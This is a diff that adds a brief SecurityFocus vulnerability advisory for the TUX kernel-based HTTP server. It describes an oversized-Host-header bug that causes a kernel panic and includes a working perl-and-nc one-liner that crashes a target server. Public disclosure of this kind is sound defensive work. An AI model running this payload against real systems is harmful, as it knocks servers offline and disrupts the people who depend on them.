@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/3506/info
+
+TUX is a kernel based HTTP server released under the GNU General Public License. It is able to serve static content, cache dynamic content, and coordinate with other HTTP servers to produce dynamic content.
+
+An error exists when the TUX daemon received an oversized Host: header as part of a HTTP request. The request will result in an assertation failure and eventually in a kernel panic. At this point a system reboot will be required to regain normal functionality. 
+
+perl -e "print qq(GET / HTTP/1.0\nAccept: */*\nHost: ) . qq(A) x 6000 .
+qq(\n)" |nc <ip address> <dest_port> 
